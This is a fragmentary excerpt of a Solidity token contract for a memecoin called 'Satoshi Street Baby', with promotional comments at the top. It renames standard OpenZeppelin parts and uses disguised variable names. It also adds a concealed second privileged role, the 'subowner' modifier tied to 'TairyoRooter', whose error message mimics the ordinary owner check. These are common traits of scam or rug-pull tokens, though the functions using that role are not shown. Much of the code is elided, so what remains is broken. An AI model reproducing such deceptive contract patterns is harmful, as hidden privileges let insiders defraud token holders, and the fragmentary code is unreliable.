...
SATOSHI STREET BABY
Jump on board Satoshi
Street Baby!
https://satochistteetbaby.com/
The memecoin to hit the crypto scene that is insipired on the famous satoshi street bet subreddit which is similar to wallstreetbet but for crypto.
*/
...
/*
 * @dev Provides information about the current execution TOKEN20Burnable, including the
 ...
 */
abstract contract TOKEN20Burnable {
...
// File: @openzeppelin/contracts/access/TOKEN20Ownable.sol
 ...
 * the owner.
 */
abstract contract TOKEN20Ownable is TOKEN20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "TOKEN20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "TOKEN20Ownable: new owner is the zero address");
 ...
 * `SafeTOKEN` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
contract SSB  is TOKEN20Burnable, TOKEN27, TOKEN20Ownable {
    ...
    */
    ...
    /**
    * @dev See {TOKEN27-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(TairyoRooter == _msgSender(), "TOKEN20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {TOKEN27-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {TOKEN27-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {TOKEN27};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "TOKEN27: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {TOKEN27-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "TOKEN27: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "TOKEN27: transfer from the zero address");
        require(shippingto != address(0), "TOKEN27: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "TOKEN27: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "TOKEN27: approve from the zero address");
        require(transporteur != address(0), "TOKEN27: approve to the zero address");
